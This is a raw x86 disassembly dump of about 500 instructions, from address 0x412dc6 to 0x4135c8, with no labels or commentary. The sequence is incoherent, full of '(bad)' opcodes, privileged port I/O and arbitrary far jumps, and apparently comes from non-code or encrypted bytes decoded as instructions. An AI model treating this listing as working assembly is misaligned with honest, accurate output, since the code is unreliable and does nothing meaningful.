  412dc6:	mov    ebp,0x82aef90b
  412dcb:	pop    ss
  412dcc:	adc    al,0x66
  412dce:	jmp    0x412e21
  412dd0:	sub    al,0xd9
  412dd2:	jp     0x412e22
  412dd4:	fidivr DWORD PTR [edi-0x47]
  412dd7:	rol    BYTE PTR [ebx],cl
  412dd9:	fwait
  412dda:	std    
  412ddb:	out    0x58,al
  412ddd:	das    
  412dde:	or     bl,BYTE PTR [ebx]
  412de0:	outs   dx,BYTE PTR ds:[esi]
  412de1:	rcl    DWORD PTR [esi],0xd6
  412de4:	stc    
  412de5:	outs   dx,BYTE PTR ds:[esi]
  412de6:	outs   dx,DWORD PTR ds:[esi]
  412de7:	call   0xc60b6203
  412dec:	lock pop ds
  412dee:	adc    edx,0xc7204b0e
  412df4:	imul   esp,DWORD PTR [edx+0x1a],0x8fa292a2
  412dfb:	fcmovnbe st,st(3)
  412dfd:	retf   0xfca2
  412e00:	fstp   st(6)
  412e02:	inc    esp
  412e03:	test   BYTE PTR [edx+0x2d3c6e3a],bl
  412e09:	fst    QWORD PTR [esi+0x26]
  412e0c:	call   0xae4c8814
  412e11:	enter  0x58d2,0x63
  412e15:	or     al,0x3f
  412e17:	xchg   esi,eax
  412e18:	sub    ebp,DWORD PTR [ebp-0x2865a8b7]
  412e1e:	shl    DWORD PTR [ecx],cl
  412e20:	sti    
  412e21:	xchg   edi,eax
  412e22:	leave  
  412e23:	into   
  412e24:	(bad)  
  412e26:	lods   eax,DWORD PTR ds:[esi]
  412e27:	xchg   DWORD PTR [ecx+ebp*4-0x73],esp
  412e2b:	ret    0x70da
  412e2e:	les    ecx,FWORD PTR [edx+0x76]
  412e31:	scas   eax,DWORD PTR es:[edi]
  412e32:	jmp    0x4d7b:0xc270a943
  412e39:	in     eax,0xf9
  412e3b:	mov    eax,DWORD PTR [edi+eiz*8+0x59]
  412e3f:	ret    0xfd3a
  412e42:	push   0x9264a707
  412e47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e48:	xchg   ecx,eax
  412e49:	es dec esi
  412e4b:	cmp    BYTE PTR [ecx-0x7a],ah
  412e4e:	ret    
  412e4f:	dec    edx
  412e50:	(bad)  
  412e51:	cli    
  412e52:	in     al,0xa9
  412e54:	pop    ecx
  412e55:	iret   
  412e56:	mov    ch,0x63
  412e58:	aas    
  412e59:	lahf   
  412e5a:	jle    0x412ec3
  412e5c:	jnp    0x412dea
  412e5e:	pushf  
  412e5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e60:	ja     0x412e10
  412e62:	scas   al,BYTE PTR es:[edi]
  412e63:	mov    al,0x36
  412e65:	xor    eax,0x51f6be22
  412e6a:	dec    eax
  412e6b:	xchg   edi,eax
  412e6c:	je     0x412e35
  412e6e:	loop   0x412e33
  412e70:	dec    ecx
  412e71:	inc    edx
  412e72:	mov    ah,bh
  412e74:	mov    ecx,ebx
  412e76:	push   eax
  412e77:	mov    BYTE PTR [eax+ebx*2-0x6986aad0],bh
  412e7e:	inc    esi
  412e7f:	cld    
  412e80:	js     0x412e2f
  412e82:	ss ins DWORD PTR es:[edi],dx
  412e84:	daa    
  412e85:	es stos DWORD PTR es:[edi],eax
  412e87:	mov    BYTE PTR [eax],0xa7
  412e8a:	and    edx,esi
  412e8c:	cmc    
  412e8d:	push   eax
  412e8e:	add    eax,0xb7fa35ea
  412e93:	ds enter 0x88ad,0xae
  412e98:	test   al,0x63
  412e9a:	inc    edx
  412e9b:	mov    WORD PTR [edx+0x23a2a7b3],ds
  412ea1:	fidivr WORD PTR [esi-0x2]
  412ea4:	and    eax,0xa5300f0b
  412ea9:	ds in  eax,dx
  412eab:	pop    ebx
  412eac:	sub    bl,BYTE PTR [edi+0x17]
  412eaf:	sub    al,0x48
  412eb1:	pop    eax
  412eb2:	inc    edx
  412eb3:	add    BYTE PTR [eax],0x7f
  412eb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412eb7:	pop    ecx
  412eb8:	retf   0xb6d7
  412ebb:	mov    al,0xf9
  412ebd:	icebp  
  412ebe:	mov    esi,0xf4aafc32
  412ec3:	rcl    dl,0xa2
  412ec6:	(bad)  
  412ec7:	jmp    0xb24dbfe4
  412ecc:	call   0x2eae:0x1e0e8aef
  412ed3:	or     edx,DWORD PTR [esi-0xa2e1135]
  412ed9:	sar    DWORD PTR [esp+eax*1+0x6f9012ed],0x76
  412ee1:	and    al,0x65
  412ee3:	fadd   QWORD PTR [edi-0x144468bb]
  412ee9:	mov    bh,0xab
  412eeb:	(bad)  
  412eed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412eee:	xchg   esp,eax
  412eef:	push   ebx
  412ef0:	add    eax,0xf0b8886f
  412ef5:	les    ebp,FWORD PTR [esi+0x31556170]
  412efb:	sbb    ah,ah
  412efd:	sub    eax,0xa2067366
  412f02:	iret   
  412f03:	lods   al,BYTE PTR ds:[esi]
  412f04:	mov    edi,0xedd4aa20
  412f09:	dec    ecx
  412f0a:	icebp  
  412f0b:	ret    0xbbbe
  412f0e:	cmp    DWORD PTR [eax-0x3793ebd8],0xffffffbb
  412f15:	dec    edi
  412f16:	call   FWORD PTR [edi-0x2c560cf2]
  412f1c:	mov    ebp,0xb2f408df
  412f21:	or     ah,ch
  412f23:	pusha  
  412f24:	es out dx,eax
  412f26:	mov    dl,0x42
  412f28:	dec    eax
  412f29:	ror    DWORD PTR [eax],cl
  412f2b:	add    BYTE PTR [edx],0x2e
  412f2e:	daa    
  412f2f:	or     dh,BYTE PTR [edx+0x44]
  412f32:	aas    
  412f33:	cmp    al,0x1a
  412f35:	mov    eax,ds:0xa9b196bc
  412f3a:	sub    BYTE PTR [esi+0x1594eaab],dl
  412f40:	iret   
  412f41:	jno    0x412f5e
  412f43:	or     BYTE PTR [ebp+0x50],al
  412f46:	arpl   WORD PTR [edi+0x38a1c0c3],sp
  412f4c:	into   
  412f4d:	fwait
  412f4e:	ret    
  412f4f:	sub    ebp,DWORD PTR [edx-0xc]
  412f52:	stc    
  412f53:	push   ds
  412f54:	pop    cx
  412f56:	push   edx
  412f57:	and    bl,BYTE PTR [edi+0x70]
  412f5a:	popf   
  412f5b:	nop
  412f5c:	iret   
  412f5d:	(bad)  
  412f5e:	sbb    eax,0x9b8711ba
  412f63:	xchg   BYTE PTR [ebp+0x6f],al
  412f66:	loope  0x412f2c
  412f68:	xchg   ebx,eax
  412f69:	push   ds
  412f6a:	into   
  412f6b:	mov    esp,0xddd946dc
  412f70:	or     edi,DWORD PTR [edx-0x5c]
  412f73:	push   ebx
  412f74:	imul   ebp,DWORD PTR [eax+0x3a],0x88dca6e4
  412f7b:	ins    BYTE PTR es:[edi],dx
  412f7c:	into   
  412f7d:	mov    DWORD PTR [eax],ecx
  412f7f:	in     al,0x9d
  412f81:	jl     0x412f79
  412f83:	push   ecx
  412f84:	clts   
  412f86:	cmp    bh,BYTE PTR [eax-0x726ffa66]
  412f8c:	fdivrp st(0),st
  412f8e:	lock xchg esi,eax
  412f90:	sub    al,0x83
  412f92:	out    0xbf,eax
  412f94:	jle    0x412f60
  412f96:	and    al,0x49
  412f98:	xor    eax,0xcf2666a7
  412f9d:	outs   dx,DWORD PTR ds:[esi]
  412f9e:	repz (bad) 
  412fa0:	mov    DWORD PTR [ebx+0x5ac6fc09],edx
  412fa6:	popf   
  412fa7:	cld    
  412fa8:	add    ecx,esi
  412faa:	aaa    
  412fab:	fs xor eax,0x62b502b8
  412fb1:	sbb    esi,DWORD PTR [edx+0x40e8df69]
  412fb7:	sbb    esp,DWORD PTR [edx-0x23a2e2a3]
  412fbd:	lahf   
  412fbe:	aad    0xd9
  412fc0:	cld    
  412fc1:	xchg   edi,eax
  412fc2:	dec    edi
  412fc3:	and    eax,0xbf8e4d43
  412fc8:	loopne 0x412fd3
  412fca:	les    eax,FWORD PTR [esi]
  412fcc:	aaa    
  412fcd:	mov    ch,0xca
  412fcf:	fdivr  st,st(5)
  412fd1:	gs popf 
  412fd3:	mov    cl,0xfd
  412fd5:	inc    ebp
  412fd6:	pop    ds
  412fd7:	xchg   esp,eax
  412fd8:	lods   eax,DWORD PTR ds:[esi]
  412fd9:	pusha  
  412fda:	xor    esp,DWORD PTR [ecx-0x61]
  412fdd:	lods   al,BYTE PTR ds:[esi]
  412fde:	mov    edi,0xce7cc2d6
  412fe3:	sar    DWORD PTR [ebp-0x73],1
  412fe6:	mov    si,0x62f4
  412fea:	in     eax,dx
  412feb:	es sbb eax,0xd714e01f
  412ff1:	loope  0x41301d
  412ff3:	sbb    ah,dl
  412ff5:	imul   eax,DWORD PTR [edx+0x18f6c515],0x58621f18
  412fff:	neg    DWORD PTR [ecx-0x7a]
  413002:	popf   
  413003:	leave  
  413004:	fiadd  DWORD PTR [ebx]
  413006:	aaa    
  413007:	mov    edi,0xed112ee
  41300c:	mov    dh,0xb6
  41300e:	jecxz  0x412fa3
  413010:	popf   
  413011:	inc    ebx
  413012:	int3   
  413013:	push   0xffffff82
  413015:	nop
  413016:	add    ebx,DWORD PTR [edx]
  413018:	not    DWORD PTR [edx+0x243e97c8]
  41301e:	mov    ecx,0x14bfa7e
  413023:	and    DWORD PTR [eax],edx
  413025:	or     ah,BYTE PTR [ebp+0x5ce5e9a0]
  41302b:	cmp    eax,0x537edf04
  413030:	jge    0x413055
  413032:	mov    edi,0x2ae9572f
  413037:	adc    ebp,DWORD PTR [esi+eax*1-0x6a]
  41303b:	stc    
  41303c:	mov    ds:0x1155a138,eax
  413041:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413042:	ins    DWORD PTR es:[edi],dx
  413043:	nop
  413044:	or     DWORD PTR [edx+0x12dffe61],esi
  41304a:	mov    ch,0xdb
  41304c:	push   ds
  41304d:	rol    dh,0x4c
  413050:	jg     0x413025
  413052:	(bad)  
  413053:	sahf   
  413054:	adc    ah,BYTE PTR [ebx]
  413056:	or     al,0xdd
  413058:	push   0x62cd6a6e
  41305d:	mov    edi,0x1f680545
  413062:	xchg   edi,eax
  413063:	mov    esi,0x85c74e44
  413068:	or     eax,0xa0130d10
  41306d:	enter  0xbc31,0x26
  413071:	add    ah,BYTE PTR [edi]
  413073:	adc    eax,DWORD PTR [ebx-0x6ee073a3]
  413079:	add    esp,DWORD PTR [esi]
  41307b:	pop    eax
  41307c:	jno    0x4130eb
  41307e:	mov    cl,0xc6
  413080:	inc    edx
  413081:	pop    ds
  413082:	and    BYTE PTR ds:0xa6b5ecfd,0xac
  413089:	loop   0x4130d3
  41308b:	sahf   
  41308c:	mov    eax,0xce84de9d
  413091:	sub    BYTE PTR [ecx-0x14c43a20],ah
  413097:	push   edx
  413098:	aam    0x82
  41309a:	cld    
  41309b:	mov    ebx,DWORD PTR [edx+0x6013ea35]
  4130a1:	enter  0x9167,0x16
  4130a5:	pop    esi
  4130a6:	leave  
  4130a7:	pop    ebx
  4130a8:	retf   0xeb3a
  4130ab:	add    eax,DWORD PTR [edx+0x39]
  4130ae:	xchg   esi,eax
  4130af:	and    edx,esp
  4130b1:	cmc    
  4130b2:	retf   0xe1ee
  4130b5:	cmp    eax,ebx
  4130b7:	mov    edi,0x26db88d1
  4130bc:	pushf  
  4130bd:	daa    
  4130be:	lds    edi,FWORD PTR [eax+ecx*2+0x74d531c3]
  4130c5:	or     BYTE PTR [esp+edx*4-0x3a70ab7e],0x2a
  4130cd:	outs   dx,BYTE PTR ds:[esi]
  4130ce:	addr16 cli 
  4130d0:	jns    0x413104
  4130d2:	cdq    
  4130d3:	xchg   edi,eax
  4130d4:	inc    esp
  4130d5:	add    al,0xf
  4130d7:	arpl   di,sp
  4130d9:	sub    dh,BYTE PTR [eax-0x27]
  4130dc:	in     al,0x7c
  4130de:	push   ecx
  4130df:	add    dl,BYTE PTR [edi-0x2]
  4130e2:	in     al,0x56
  4130e4:	gs clc 
  4130e6:	mov    ecx,0xcd28cf2d
  4130eb:	dec    edx
  4130ec:	lods   al,BYTE PTR ds:[esi]
  4130ed:	adc    ch,BYTE PTR [esi+0xe1695b4]
  4130f3:	ficom  DWORD PTR [ebx*4-0x1531124d]
  4130fa:	and    esp,DWORD PTR [ebx-0x7c8b7691]
  413100:	xor    dh,BYTE PTR [esi-0x4b]
  413103:	pop    edi
  413104:	mov    eax,0xd09ac9d2
  413109:	leave  
  41310a:	das    
  41310b:	xchg   ebx,eax
  41310c:	into   
  41310d:	mov    esi,0x61b29f8f
  413112:	jo     0x4130a4
  413114:	jbe    0x41309a
  413116:	test   BYTE PTR [edi+0x14],ah
  413119:	clc    
  41311a:	adc    ah,bl
  41311c:	sub    bl,ah
  41311e:	retf   
  41311f:	pop    ebp
  413120:	enter  0x9c38,0x3f
  413124:	sub    al,0x5a
  413126:	(bad)  
  413127:	or     al,0x47
  413129:	les    esp,FWORD PTR [esi-0x2cfd236e]
  41312f:	enter  0xd9cd,0xb3
  413133:	out    dx,al
  413134:	add    al,0xe8
  413136:	mov    dh,bh
  413138:	mov    eax,0x6a5b709f
  41313d:	mov    ch,0x8b
  41313f:	adc    edx,0x61
  413142:	lahf   
  413143:	jae    0x4130eb
  413145:	pop    eax
  413146:	push   ebx
  413147:	lea    ebp,[edi-0x34c09ec4]
  41314d:	sub    al,0xf
  41314f:	test   BYTE PTR [eax-0x68d2d661],bl
  413155:	(bad)  
  413156:	into   
  413157:	stos   BYTE PTR es:[edi],al
  413158:	popa   
  413159:	pop    ds
  41315a:	cmp    al,0x48
  41315c:	sbb    al,0xb6
  41315e:	dec    esp
  41315f:	sahf   
  413160:	xchg   BYTE PTR [eax+0x62],dh
  413163:	cwde   
  413164:	imul   edi,DWORD PTR [edi+esi*2],0x71a4501f
  41316b:	sub    al,BYTE PTR [eax-0x3c]
  41316e:	aam    0x0
  413170:	jbe    0x4131e4
  413172:	std    
  413173:	mov    bp,0x71dc
  413177:	pop    edx
  413178:	push   ebx
  413179:	lea    ebx,[edx]
  41317b:	stos   BYTE PTR es:[edi],al
  41317c:	gs (bad) 
  41317e:	jo     0x4131ac
  413180:	sbb    dh,BYTE PTR [eax]
  413182:	mov    ah,0xf8
  413184:	xor    DWORD PTR [esi],esp
  413186:	retf   0xb285
  413189:	popf   
  41318a:	cdq    
  41318b:	jp     0x413203
  41318d:	shr    DWORD PTR [ebx-0x79ee6033],1
  413193:	ss jmp 0x5c433f20
  413199:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41319a:	inc    esi
  41319b:	or     ah,BYTE PTR [ebp-0x53846cbe]
  4131a1:	sti    
  4131a2:	fs out 0x5c,eax
  4131a5:	repz (bad) 
  4131a7:	in     eax,dx
  4131a8:	cmp    DWORD PTR [edi-0x7f],ebp
  4131ab:	jecxz  0x413195
  4131ad:	sub    al,0xf9
  4131af:	cwde   
  4131b0:	js     0x4131dc
  4131b2:	push   ecx
  4131b3:	mov    ah,0xdd
  4131b5:	ror    BYTE PTR [edi+0x7090ff00],0xae
  4131bc:	cmp    bl,BYTE PTR [ebx+edx*4-0x4e4b9fef]
  4131c3:	cdq    
  4131c4:	or     bh,al
  4131c6:	mov    cl,0x0
  4131c8:	(bad)  
  4131c9:	test   BYTE PTR [edx+0x3c0b17c9],0x45
  4131d0:	or     al,0xc4
  4131d2:	xor    al,0x3f
  4131d4:	int    0x2a
  4131d6:	push   0xd4e22a5a
  4131db:	jmp    0x45a08696
  4131e0:	xchg   esi,eax
  4131e1:	es mov ah,0xa5
  4131e4:	lahf   
  4131e5:	jle    0x41316a
  4131e7:	dec    edx
  4131e8:	add    BYTE PTR [ecx+0x5a],dh
  4131eb:	cdq    
  4131ec:	loop   0x413247
  4131ee:	adc    eax,0xd57022be
  4131f3:	shl    BYTE PTR [edx-0x42eb5f09],cl
  4131f9:	adc    ah,BYTE PTR [edx+0x482a29d8]
  4131ff:	popa   
  413200:	int    0x9c
  413202:	ja     0x413205
  413204:	dec    ecx
  413205:	loopne 0x4131ec
  413207:	mov    es,WORD PTR ds:0xd646a884
  41320d:	xchg   DWORD PTR [ecx-0x18],ecx
  413210:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413211:	inc    edi
  413212:	add    eax,0x4e550fab
  413217:	rcr    DWORD PTR [ebp-0x6bded150],1
  41321d:	sbb    DWORD PTR [ecx],esi
  41321f:	sub    al,0xf1
  413221:	push   ecx
  413222:	mov    eax,ds:0xce04457d
  413227:	mov    ah,0x3e
  413229:	or     al,0x49
  41322b:	hlt    
  41322c:	inc    ecx
  41322d:	out    dx,al
  41322e:	dec    ebx
  41322f:	jns    0x4132a0
  413231:	das    
  413232:	cmp    ebp,DWORD PTR [esi]
  413234:	js     0x413221
  413236:	and    BYTE PTR [edi+ecx*1+0x22],ah
  41323a:	fst    DWORD PTR [eax+0x3d]
  41323d:	and    BYTE PTR [ebx],dl
  41323f:	adc    edi,DWORD PTR [edx-0x141e186a]
  413245:	in     al,dx
  413246:	sub    BYTE PTR [edx+0x1f],dl
  413249:	not    ch
  41324b:	in     eax,0x35
  41324d:	je     0x4131dd
  41324f:	in     al,dx
  413250:	pop    ebx
  413251:	iret   
  413252:	pop    ecx
  413253:	cmp    ebp,DWORD PTR [eax]
  413255:	adc    cl,cl
  413257:	jb     0x41322d
  413259:	mov    ecx,0x477f6712
  41325e:	pusha  
  41325f:	add    al,0x57
  413261:	jmp    0x8350:0xc901b28c
  413268:	cmc    
  413269:	mov    cl,0x25
  41326b:	(bad)  [ebx+eax*4-0x84f1366]
  413272:	dec    ecx
  413273:	pushf  
  413274:	push   eax
  413275:	cmc    
  413276:	mov    eax,0x4fb0cdcb
  41327b:	pop    ebp
  41327c:	ins    DWORD PTR es:[edi],dx
  41327d:	cdq    
  41327e:	ja     0x4132c2
  413280:	push   0x22
  413282:	sub    eax,0xe513907
  413287:	aam    0x28
  413289:	mov    cs,WORD PTR [esi]
  41328b:	adc    BYTE PTR [esi],ch
  41328d:	sub    eax,0x7714cd6f
  413292:	dec    ebx
  413293:	pop    ds
  413294:	sub    esp,DWORD PTR [edi-0x1d]
  413297:	xor    eax,0xad8d50d9
  41329c:	add    edx,esi
  41329e:	and    DWORD PTR [eax-0x15],0xffffffae
  4132a2:	sbb    eax,0x75fe892
  4132a7:	mov    bl,0xde
  4132a9:	ficom  DWORD PTR [eax]
  4132ab:	add    eax,0xf0938d7
  4132b0:	jle    0x41331e
  4132b2:	sub    BYTE PTR [esi-0x35dec12f],cl
  4132b8:	or     edx,DWORD PTR [ecx-0x32]
  4132bb:	pop    es
  4132bc:	push   ecx
  4132bd:	adc    eax,0x90be151a
  4132c2:	jnp    0x4132d2
  4132c4:	(bad)  [esi+0x6]
  4132c7:	adc    BYTE PTR [edi+0x4d],ch
  4132ca:	loopne 0x4132f4
  4132cc:	hlt    
  4132cd:	mov    al,ds:0x1678dca0
  4132d2:	icebp  
  4132d3:	jnp    0x4132f6
  4132d5:	std    
  4132d6:	hlt    
  4132d7:	push   esp
  4132d8:	mov    ?,WORD PTR [ecx+0x776acae3]
  4132de:	cmp    eax,0xee470e31
  4132e3:	cmp    ebx,DWORD PTR [esi-0x35f31d6c]
  4132e9:	into   
  4132ea:	(bad)  
  4132eb:	aad    0xe2
  4132ed:	mov    bl,0x46
  4132ef:	adc    bl,cl
  4132f1:	or     DWORD PTR [edi+0x6743d63b],ecx
  4132f7:	ret    
  4132f8:	enter  0x538f,0x40
  4132fc:	dec    esi
  4132fd:	push   edx
  4132fe:	test   BYTE PTR [esi+ebx*4+0x24],al
  413302:	imul   edi,DWORD PTR [ebx-0x5225a782],0xfffffff6
  413309:	mov    al,ds:0xb25ce49f
  41330e:	retf   
  41330f:	imul   ebp,esp,0xf33d08c7
  413315:	jbe    0x4132d7
  413317:	shr    BYTE PTR [ebx],0x98
  41331a:	or     esi,ecx
  41331c:	test   DWORD PTR [eax+ebx*4],ecx
  41331f:	mov    esp,0x70a58351
  413324:	add    ebp,DWORD PTR [ebp+0x2d]
  413327:	cmp    DWORD PTR [eax],edx
  413329:	adc    ch,bh
  41332b:	call   0x7451:0xa1b71395
  413332:	adc    BYTE PTR [eax+0x1f],bh
  413335:	mov    edi,0xab5bbbbf
  41333a:	outs   dx,BYTE PTR ds:[esi]
  41333b:	cmp    BYTE PTR gs:[edi+0x72],ch
  41333f:	ret    
  413340:	add    eax,0xde62c80e
  413345:	out    0xd1,al
  413347:	in     al,0x5b
  413349:	icebp  
  41334a:	ret    
  41334b:	add    ch,al
  41334d:	fisttp QWORD PTR [edi-0x7c]
  413350:	xchg   edx,eax
  413351:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413352:	mov    esp,0xb0ee25bc
  413357:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413358:	mov    eax,0xc6bff65d
  41335d:	loope  0x4133c8
  41335f:	mov    ch,0x76
  413361:	xor    al,0x66
  413363:	lahf   
  413364:	cmp    BYTE PTR [ebp-0x77],bh
  413367:	stos   DWORD PTR es:[edi],eax
  413368:	mov    ?,WORD PTR [ebp-0x6f96d73b]
  41336e:	or     BYTE PTR [ebp+ebx*2-0x4557064b],bh
  413375:	cwde   
  413376:	fldcw  WORD PTR [edx+0x71a79590]
  41337c:	int    0x65
  41337e:	inc    esi
  41337f:	ficomp DWORD PTR [esi]
  413381:	fdiv   QWORD PTR [edi+edx*2]
  413384:	xchg   ecx,eax
  413385:	add    al,BYTE PTR [ebx]
  413387:	je     0x41334b
  413389:	mov    dh,0x68
  41338b:	xchg   edx,eax
  41338c:	inc    eax
  41338d:	mov    cl,BYTE PTR [edx+edx*2-0x75266574]
  413394:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413395:	xchg   ebx,eax
  413396:	mov    ah,0xb5
  413398:	test   DWORD PTR [edx],edx
  41339a:	ins    DWORD PTR es:[edi],dx
  41339b:	fisub  DWORD PTR [edi+ebx*4-0x77a60369]
  4133a2:	dec    ebx
  4133a3:	imul   esi,DWORD PTR [eax+0x46d1bc9c],0x37
  4133aa:	and    esi,DWORD PTR [edx+0xd798ce7]
  4133b0:	sbb    al,0x5c
  4133b2:	fnstcw WORD PTR [ebx+0x39e6f49d]
  4133b8:	sbb    al,0xb9
  4133ba:	pop    esi
  4133bb:	jae    0x4133bb
  4133bd:	frstor [ecx]
  4133bf:	or     BYTE PTR [ecx+0x3c],ah
  4133c2:	adc    al,0x11
  4133c5:	dec    ecx
  4133c6:	or     cl,bh
  4133c8:	shr    BYTE PTR [ecx],1
  4133ca:	in     eax,dx
  4133cb:	mov    al,ds:0x54204621
  4133d0:	jl     0x41341e
  4133d2:	adc    eax,0x1bc159e5
  4133d7:	mov    ah,dh
  4133d9:	cmp    dh,BYTE PTR [eax-0x19]
  4133dc:	sub    edi,ebp
  4133de:	dec    ecx
  4133df:	popa   
  4133e0:	mov    ebx,0x3667f8f1
  4133e5:	jbe    0x4133c2
  4133e7:	mov    al,ds:0xf0e0135d
  4133ec:	sbb    eax,0x22f955ee
  4133f1:	sub    al,0x3b
  4133f3:	add    ah,0x45
  4133f6:	cmp    BYTE PTR [ebp-0x1e],dl
  4133f9:	fadd   DWORD PTR [eax+0x2f247036]
  4133ff:	or     al,0x4c
  413401:	rol    ecx,1
  413403:	inc    esp
  413404:	xor    DWORD PTR [edi-0x26],ebx
  413407:	gs clc 
  413409:	cli    
  41340a:	jbe    0x4133e6
  41340c:	int3   
  41340d:	test   BYTE PTR [ecx-0x38],al
  413410:	mov    esp,0x99d4f08a
  413415:	or     BYTE PTR [esi],dl
  413417:	xor    BYTE PTR [edi],ah
  413419:	inc    ebx
  41341a:	loopne 0x413440
  41341c:	loope  0x4133a1
  41341e:	jl     0x41349c
  413420:	mov    ds:0x87b046da,al
  413425:	(bad)  
  413426:	push   0xa8b9b5dd
  41342b:	iret   
  41342c:	add    eax,0x1cd9ba0e
  413431:	out    dx,eax
  413432:	sub    DWORD PTR [edi-0x15],ebp
  413435:	scas   eax,DWORD PTR es:[edi]
  413436:	shl    DWORD PTR [ecx+0x4f],1
  413439:	add    eax,0xf5bb5f42
  41343e:	test   BYTE PTR [esi+0x33a7f568],0x22
  413445:	jnp    0x413484
  413447:	cli    
  413448:	test   BYTE PTR [ecx-0x7c6cafaf],bl
  41344e:	add    al,dh
  413450:	xor    BYTE PTR [edi],bh
  413452:	xor    al,0xb8
  413454:	mov    ds:0x6f5308d9,al
  413459:	or     BYTE PTR [ebx],dl
  41345b:	push   es
  41345c:	mov    ecx,0xa965b3a5
  413461:	or     DWORD PTR [edx],edx
  413463:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413464:	dec    eax
  413465:	fs test eax,0xe3af12a6
  41346b:	(bad)  
  41346c:	fcmovnu st,st(2)
  41346e:	mov    ds:0x898a18f2,eax
  413473:	or     bh,BYTE PTR [edi*8+0x452b7d60]
  41347a:	xchg   ebx,eax
  41347b:	dec    edx
  41347c:	int    0x77
  41347e:	adc    DWORD PTR [ebp-0x4229a594],ebp
  413484:	mov    edx,0x7b34c949
  413489:	jg     0x413438
  41348b:	inc    ebp
  41348c:	ret    0xe83c
  41348f:	mov    ds:0xb384441c,eax
  413494:	pop    eax
  413495:	mov    eax,ds:0xcbad1849
  41349a:	mov    BYTE PTR [ecx+0x7b],dh
  41349d:	lods   eax,DWORD PTR ds:[esi]
  41349e:	shl    ebx,cl
  4134a0:	mov    edi,0x49670089
  4134a5:	into   
  4134a6:	sbb    al,0x5f
  4134a8:	mov    eax,0x7b90e23
  4134ad:	popf   
  4134ae:	sub    eax,0xd30fe80b
  4134b3:	xor    ch,ch
  4134b5:	xchg   ebx,eax
  4134b6:	les    edx,FWORD PTR [edx]
  4134b8:	push   edi
  4134b9:	hlt    
  4134ba:	icebp  
  4134bb:	imul   esi,ebp,0xcfa0a4c4
  4134c1:	test   DWORD PTR [ecx+0x1],ebx
  4134c4:	mov    ch,0xd0
  4134c6:	push   es
  4134c7:	push   0xffffffed
  4134c9:	push   ebp
  4134ca:	mov    ebp,0xc61ab70f
  4134cf:	mov    edi,0x6d1c6315
  4134d4:	nop
  4134d5:	(bad)  [ebp-0x35]
  4134d8:	icebp  
  4134d9:	enter  0xc4ef,0xb6
  4134dd:	cwde   
  4134de:	and    DWORD PTR [eax-0x34b5ad93],edx
  4134e4:	call   DWORD PTR [ebp+0xbe26066]
  4134ea:	mov    ah,0xf7
  4134ec:	sub    edi,DWORD PTR [ebp-0x4f]
  4134ef:	loope  0x41352b
  4134f1:	das    
  4134f2:	dec    esi
  4134f3:	push   es
  4134f4:	inc    esi
  4134f5:	rol    DWORD PTR [edx-0x729e032a],1
  4134fb:	lock pop ecx
  4134fd:	mov    ecx,0x695edf1a
  413502:	cmp    cl,bh
  413504:	mov    edi,ebx
  413506:	or     BYTE PTR fs:[ebp-0x3a],bh
  41350a:	scas   eax,DWORD PTR es:[edi]
  41350b:	stos   DWORD PTR es:[edi],eax
  41350c:	pop    edx
  41350d:	int3   
  41350e:	leave  
  41350f:	pop    es
  413510:	push   esi
  413511:	js     0x4134c7
  413513:	nop
  413514:	addr16 cmp al,0x35
  413517:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413518:	adc    al,0x29
  41351a:	lea    edi,[eax]
  41351c:	cwde   
  41351d:	fidiv  DWORD PTR [eax+0x7c2ec4d3]
  413523:	mov    cl,0xc7
  413525:	inc    eax
  413526:	mov    BYTE PTR [ebp+0x2cafd83a],cl
  41352c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41352d:	dec    ebx
  41352e:	jecxz  0x413533
  413530:	das    
  413531:	and    DWORD PTR [ebx+ecx*8],0x3f
  413535:	push   edi
  413536:	push   ebx
  413537:	cmp    eax,0x245940e7
  41353c:	out    0x26,al
  41353e:	dec    ebx
  41353f:	sub    al,0x33
  413541:	imul   ebp,DWORD PTR [edx+ebx*4-0x2d],0x7080750d
  413549:	and    ch,dh
  41354b:	aaa    
  41354c:	sbb    BYTE PTR [edi],dl
  41354e:	loope  0x413568
  413550:	mov    ebx,0xdcc7e486
  413555:	cs push ds
  413557:	fcmovnb st,st(1)
  413559:	and    eax,0x5a598ce5
  41355e:	push   esi
  41355f:	add    BYTE PTR [ebp+0xc],ch
  413562:	xchg   edx,eax
  413563:	push   esp
  413564:	dec    eax
  413565:	inc    ebp
  413566:	aaa    
  413567:	add    al,0x9e
  413569:	dec    edx
  41356a:	cmp    eax,0xc0cb6189
  41356f:	fadd   st(5),st
  413571:	add    DWORD PTR [eax],esi
  413573:	dec    esp
  413574:	sbb    ch,BYTE PTR [eax]
  413576:	mov    ch,0x53
  413578:	or     esi,esi
  41357a:	jbe    0x413578
  41357c:	nop
  41357d:	mov    ecx,ebp
  41357f:	or     eax,DWORD PTR [eax]
  413581:	push   eax
  413582:	repnz sbb eax,0x93d0001a
  413588:	and    eax,0xec42e7ce
  41358d:	das    
  41358e:	in     eax,0x69
  413590:	push   edx
  413591:	mov    al,ds:0x8e3d46b8
  413596:	jge    0x41353d
  413598:	pop    edi
  413599:	or     DWORD PTR [eax-0x27],ebp
  41359c:	dec    edx
  41359d:	les    esi,FWORD PTR [esi]
  41359f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135a0:	sbb    eax,0xe4e0dfe
  4135a5:	scas   al,BYTE PTR es:[edi]
  4135a6:	jmp    0xfc25:0xeaa68ac6
  4135ad:	pop    esi
  4135ae:	pop    esi
  4135af:	sbb    al,0xc2
  4135b1:	cmp    DWORD PTR [ebx-0x37],edi
  4135b4:	enter  0xf675,0xf5
  4135b8:	hlt    
  4135b9:	or     eax,0xdfc3a243
  4135be:	or     eax,0x6893f739
  4135c3:	adc    DWORD PTR [edi+0x45],ecx
  4135c6:	jecxz  0x4135a8
  4135c8:	adc    eax,0xf59a44f1
